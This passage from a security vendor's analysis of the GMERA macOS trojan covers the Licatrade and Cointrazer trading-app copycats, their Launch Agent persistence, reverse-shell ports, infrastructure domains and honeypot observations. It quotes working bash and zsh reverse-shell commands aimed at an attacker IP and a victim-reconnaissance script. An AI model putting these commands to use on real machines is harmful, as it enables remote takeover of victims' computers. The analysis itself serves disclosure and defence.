id="crayon-6057fb248ed31055738296-13"><span class="crayon-i">cp</span><span class="crayon-h"> </span><span class="crayon-s">"/tmp/.com.apple.system.plist"</span><span class="crayon-h"> </span><span class="crayon-s">"$HOME/Library/LaunchAgents/.com.apple.system.plist"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-14"><span class="crayon-e">launchctl </span><span class="crayon-i">load</span><span class="crayon-h"> </span><span class="crayon-s">"/tmp/.com.apple.system.plist"</span></div><div class="crayon-line" id="crayon-6057fb248ed31055738296-15"><span class="crayon-v">scre</span><span class="crayon-o">=</span><span class="crayon-sy">`</span><span class="crayon-v">screen</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">d</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">m</span><span class="crayon-h"> </span><span class="crayon-v">bash</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-s">'bash -i &gt;/dev/tcp/193.37.212[.]97/25733 0&gt;&amp;1'</span><span class="crayon-sy">`</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>&nbsp;</p>
<p>It’s interesting to note that persistence is broken in the Licatrade sample: the content of the resulting Launch Agent file (<span style="font-family: courier new, courier, monospace;">.com.apple.system.plist</span>) isn’t in Property List format as <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/TP40001762-104142" target="_blank" rel="noopener">launchd expects</a>, but instead is the command line to be executed.</p>
<p>The decoded content (ellipses in long strings) of the <span style="font-family: courier new, courier, monospace;">$plist_text</span> variable is:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057fb248ed3a711326848" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
echo 'sdvkmsdfmsd…kxweivneivne'; while :; do sleep 10000; screen -X quit; lsof -ti :25733 | xargs kill -9; screen -d -m bash -c 'bash -i &gt;/dev/tcp/193.37.212[.]97/25733 0&gt;&amp;1'; done; echo 'sdvkmsdfmsdfms…nicvmdskxweivneivne'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057fb248ed3a711326848-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057fb248ed3a711326848-1"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'sdvkmsdfmsd…kxweivneivne'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">do</span><span class="crayon-h"> </span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">10000</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">screen</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">X</span><span class="crayon-h"> </span><span class="crayon-v">quit</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">lsof</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">ti</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-cn">25733</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">xargs </span><span class="crayon-v">kill</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">9</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">screen</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">d</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">m</span><span class="crayon-h"> </span><span class="crayon-v">bash</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-s">'bash -i &gt;/dev/tcp/193.37.212[.]97/25733 0&gt;&amp;1'</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">done</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'sdvkmsdfmsdfms…nicvmdskxweivneivne'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>&nbsp;</p>
<p>If run directly, this code would open a reverse shell from the victim machine to an attacker-controlled server, but that fails here. Fortunately for the attackers, the last line of the shell script also starts a reverse shell to their server.</p>
<p>The Cointrazer sample, used in campaigns prior to Licatrade, does not suffer from this issue: the Launch Agent is installed and successfully starts when the user logs in.</p>
<p>The various reverse shells used by these malware operators connect to different remote ports depending on how they were started. All connections are unencrypted. Here is a list of ports, based on the Licatrade sample.</p>

<table id="tablepress-856" class="tablepress tablepress-id-856">
<thead>
<tr class="row-1 odd">
	<th class="column-1">TCP Port</th><th class="column-2">Where</th><th class="column-3">How</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td rowspan="3" class="column-1"><strong>﻿25733</strong></td><td class="column-2">Licatrade executable</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">zsh</span>  in <span style="font-family: courier new, courier, monospace;"> screen</span>  using <span style="font-family: courier new, courier, monospace;"> ztcp</span></td>
</tr>
<tr class="row-3 odd">
	<td class="column-2"><span style="font-family: courier new, courier, monospace;">run.sh</span></td><td class="column-3"><span style="font-family: courier new, courier, monospace;">bash</span>  in <span style="font-family: courier new, courier, monospace;"> screen</span>  using <span style="font-family: courier new, courier, monospace;"> /dev/tcp</span></td>
</tr>
<tr class="row-4 even">
	<td class="column-2">Launch Agent (Not working)</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">bash</span>  in <span style="font-family: courier new, courier, monospace;"> screen</span>  using <span style="font-family: courier new, courier, monospace;"> /dev/tcp</span></td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><strong>25734</strong></td><td class="column-2">Licatrade executable</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">zsh</span>  using <span style="font-family: courier new, courier, monospace;"> ztcp</span></td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><strong>25735</strong></td><td class="column-2">Licatrade executable</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">bash</span>  using <span style="font-family: courier new, courier, monospace;"> /dev/tcp</span></td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><strong>25736</strong></td><td class="column-2">Licatrade executable</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">bash</span>  in <span style="font-family: courier new, courier, monospace;"> screen</span>  using <span style="font-family: courier new, courier, monospace;"> /dev/tcp</span></td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><strong>25737</strong></td><td class="column-2">Licatrade executable</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">bash</span>  in <span style="font-family: courier new, courier, monospace;"> screen</span>  using <span style="font-family: courier new, courier, monospace;"> /dev/tcp</span></td>
</tr>
<tr class="row-9 odd">
	<td class="column-1"><strong>25738</strong></td><td class="column-2">Licatrade executable</td><td class="column-3"><span style="font-family: courier new, courier, monospace;">zsh</span>  in <span style="font-family: courier new, courier, monospace;"> screen</span>  using <span style="font-family: courier new, courier, monospace;"> ztcp</span></td>
</tr>
</tbody>
</table>

<p>Here are some example command lines used:</p>
<ul>
<li>Bash in screen using /dev/tcp:</li>
</ul>
<p><span style="font-family: courier new, courier, monospace;">screen -d -m bash -c &#8216;bash -i &gt;/dev/tcp/193.37.212[.]97/25733 0&gt;&amp;1&#8217;</span></p>
<ul>
<li>zsh using ztcp:</li>
</ul>
<p><span style="font-family: courier new, courier, monospace;">zsh -c &#8216;zmodload zsh/net/tcp &amp;&amp; ztcp 193.37.212[.]97 25734 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#8217;</span></p>
<p>The rebranded Kattana application is also in the resources of the application bundle. We wanted to see if, besides the change in name and icon in the application, some other code was changed. Since Kattana asks for credentials for trading platforms to perform trading, we verified if the input fields of these were tampered with and if credentials were exfiltrated in some way. Kattana is built with <a href="https://www.electronjs.org/" target="_blank" rel="noopener">Electron</a>, and Electron apps have an <span style="font-family: courier new, courier, monospace;">app.asar</span> file, which is an archive containing the JavaScript code of the application. We have checked all changes between the original Kattana application and the malicious Licatrade copycat and found that only strings and images were changed.</p>
<div id="attachment_140778" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-5.-Partial-difference-between-Kattana-and-Licatrade.png"><img class="wp-image-140778" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-5.-Partial-difference-between-Kattana-and-Licatrade-150x150.png" alt="" width="600" height="511" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-5.-Partial-difference-between-Kattana-and-Licatrade-300x255.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-5.-Partial-difference-between-Kattana-and-Licatrade-768x654.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-5.-Partial-difference-between-Kattana-and-Licatrade-1024x871.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-5.-Partial-difference-between-Kattana-and-Licatrade.png 1544w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 5. Partial difference between Kattana and Licatrade</i></p></div>
<p>Licatrade and its resources were all signed using the same certificate, having the common name field set to <span style="font-family: courier new, courier, monospace;">Andrey Novoselov</span> and using developer ID <span style="font-family: courier new, courier, monospace;">M8WVDT659T</span>. The certificate was issued by Apple on April 6<sup>th</sup>, 2020. It was revoked the same day we notified Apple about this malicious application.</p>
<div id="attachment_140779" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-6.-Certificate-used-to-sign-Licatrade.png"><img class="wp-image-140779" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-6.-Certificate-used-to-sign-Licatrade-150x150.png" alt="" width="600" height="300" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-6.-Certificate-used-to-sign-Licatrade-300x150.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-6.-Certificate-used-to-sign-Licatrade-768x384.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-6.-Certificate-used-to-sign-Licatrade-1024x512.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-6.-Certificate-used-to-sign-Licatrade.png 1129w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 6. Certificate used to sign Licatrade</i></p></div>
<div id="attachment_140780" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-7.-Licatrade-certificate-was-revoked-May-28th-2020.png"><img class="wp-image-140780" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-7.-Licatrade-certificate-was-revoked-May-28th-2020-150x150.png" alt="" width="600" height="257" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-7.-Licatrade-certificate-was-revoked-May-28th-2020-300x128.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-7.-Licatrade-certificate-was-revoked-May-28th-2020-768x329.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-7.-Licatrade-certificate-was-revoked-May-28th-2020.png 827w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 7. Licatrade certificate was revoked May 28th, 2020</i></p></div>
<p>For each of the other campaigns we analyzed, a different certificate was used. Both were already revoked by Apple when we started our analyses. See the <em>IoCs</em> section for details about these. It’s interesting to note that in the case of Cointrazer, there were only 15 minutes between the moment the certificate was issued by Apple and the malefactors signing their trojanized application. This, and the fact that we didn’t find anything else signed with the same key, suggests they got the certificate explicitly for that purpose.</p>
<h2>Infrastructure</h2>
<p>The malicious Licatrade application was available on the <span style="font-family: courier new, courier, monospace;">licatrade.com</span> website and its C&amp;C HTTP report server domain is <span style="font-family: courier new, courier, monospace;">stepbystepby.com</span>. Both domains were registered using the <span style="font-family: courier new, courier, monospace;">levistor777@gmail.com</span> email address. Searching for other domains registered with that email address reveals what looks like several previous campaigns. Here is a list of domains we found in samples or registered with that email address.</p>

<table id="tablepress-857" class="tablepress tablepress-id-857">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Domain name</th><th class="column-2">Registration date</th><th class="column-3">Comment</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">repbaerray.pw</td><td class="column-2">2019-02-25</td><td class="column-3">C&amp;C server for HTTP report of Stockfolio app</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">macstockfolio.com</td><td class="column-2">2019-03-03</td><td class="column-3">Website distributing the malicious Stockfolio app</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">latinumtrade.com</td><td class="column-2">2019-07-25</td><td class="column-3">Website distributing the malicious Latinum app</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">trezarus.com</td><td class="column-2">2019-06-03</td><td rowspan="2" class="column-3">Website distributing the malicious Trezarus app</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">trezarus.net</td><td class="column-2">2019-08-07</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">cointrazer.com</td><td class="column-2">2019-08-18</td><td class="column-3">Website distributing the malicious Cointrazer app</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">apperdenta.com</td><td class="column-2">2019-08-18</td><td class="column-3">Usage unknown</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">narudina.com</td><td class="column-2">2019-09-23</td><td class="column-3">Usage unknown</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">nagsrsdfsudinasa.com</td><td class="column-2">2019-10-09</td><td class="column-3">C&amp;C server for HTTP report of Cointrazer app</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">cupatrade.com</td><td class="column-2">2020-03-28</td><td class="column-3">Website distributing the malicious Cupatrade app</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">stepbystepby.com</td><td class="column-2">2020-04-07</td><td class="column-3">C&amp;C server for HTTP report of Licatrade app</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">licatrade.com</td><td class="column-2">2020-04-13</td><td class="column-3">Website distributing the malicious Licatrade app</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">creditfinelor.com</td><td class="column-2">2020-05-29</td><td class="column-3">Empty page, usage unknown</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">maccatreck.com</td><td class="column-2">2020-05-29</td><td class="column-3">Some authentication form</td>
</tr>
</tbody>
</table>

<p>Both the websites and HTTP C&amp;C servers receiving the malware’s first report are hosted behind Cloudflare.</p>
<h2>Honeypot interactions</h2>
<p>To learn more about the intentions of this group, we set up honeypots where we monitored all interactions between the GMERA reverse shell backdoors and the operators of this malware.</p>
<p>We saw no C&amp;C commands issued via the HTTP C&amp;C server channel; everything happened through the reverse shells. When it first connected, the C&amp;C server sent a small script to gather the username, the macOS version and location (based on external IP address) of the compromised device.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057fb248ed3c828321737" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#! /bin/bash
function check() {
        if [ ! -f /private/var/tmp/.i ]; then
        write
    else
        if [ "$(( $(date +"%s") - $(stat -f "%m" /private/var/tmp/.i) ))" -gt "21600" ]; then
                   write
                fi
        fi
}
function write() {
        getit=`curl -s ipinfo.io | grep -e country -e city | sed 's/[^a-zA-Z0-9]//g' | sed -e "s/city//g;s/country//g"`
    echo `whoami` &gt; /private/var/tmp/.i
    echo `sw_vers -productVersion` &gt;&gt; /private/var/tmp/.i
    echo "$getit" &gt;&gt; /private/var/tmp/.i
}
check
cat /private/var/tmp/.i</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-2">2</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-4">4</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-6">6</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-8">8</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-10">10</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-12">12</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-14">14</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-16">16</div><div class="crayon-num" data-line="crayon-6057fb248ed3c828321737-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3c828321737-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057fb248ed3c828321737-1"><span class="crayon-p">#! /bin/bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">check</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-m">private</span><span class="crayon-o">/</span><span class="crayon-t">var</span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">write</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-5"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">"$(( $(date +"</span><span class="crayon-o">%</span><span class="crayon-i">s</span><span class="crayon-s">") - $(stat -f "</span><span class="crayon-o">%</span><span class="crayon-i">m</span><span class="crayon-s">" /private/var/tmp/.i) ))"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">gt</span><span class="crayon-h"> </span><span class="crayon-s">"21600"</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">then</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">write</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-8"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">fi</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-9"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">fi</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-10"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-11"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">getit</span><span class="crayon-o">=</span><span class="crayon-sy">`</span><span class="crayon-v">curl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-v">ipinfo</span><span class="crayon-sy">.</span><span class="crayon-v">io</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">grep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-v">country</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-v">city</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-i">sed</span><span class="crayon-h"> </span><span class="crayon-s">'s/[^a-zA-Z0-9]//g'</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">sed</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-s">"s/city//g;s/country//g"</span><span class="crayon-sy">`</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">`</span><span class="crayon-v">whoami</span><span class="crayon-sy">`</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-m">private</span><span class="crayon-o">/</span><span class="crayon-t">var</span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-i">i</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">`</span><span class="crayon-v">sw_vers</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">productVersion</span><span class="crayon-sy">`</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-m">private</span><span class="crayon-o">/</span><span class="crayon-t">var</span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-i">i</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"$getit"</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-m">private</span><span class="crayon-o">/</span><span class="crayon-t">var</span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-i">i</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-16"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-6057fb248ed3c828321737-17"><span class="crayon-e">check</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3c828321737-18"><span class="crayon-v">cat</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-m">private</span><span class="crayon-o">/</span><span class="crayon-t">var</span><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">i</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>&nbsp;</p>
<p>which sent something like this to the operators:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057fb248ed3e445807139" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
jeremy
10.13.4
Bratislava
SK</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057fb248ed3e445807139-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3e445807139-2">2</div><div class="crayon-num" data-line="crayon-6057fb248ed3e445807139-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed3e445807139-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057fb248ed3e445807139-1"><span class="crayon-i">jeremy</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3e445807139-2"><span class="crayon-cn">10.13.4</span></div><div class="crayon-line" id="crayon-6057fb248ed3e445807139-3"><span class="crayon-e">Bratislava</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed3e445807139-4"><span class="crayon-v">SK</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p>&nbsp;</p>
<p>The TCP connection stays open and waits for further commands. In our case, after a while, the operators manually inspected the machine. Across several of our honeypots, the commands used to perform that inspection varied. Part of it was just listing files across the file system. Sometimes, they would copy-and-paste a base64-encoded script designed to list information to reveal whether the system is a honeypot or actually interesting. The script is decoded, then piped to bash.</p>
<div id="attachment_140781" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script.png"><img class="wp-image-140781" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script-150x150.png" alt="" width="600" height="407" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script-300x203.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script-768x521.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script-151x103.png 151w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script-114x76.png 114w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-8.-Packet-capture-of-the-operator-sending-the-base64-encoded-secondary-reconnaissance-script-97x65.png 97w, 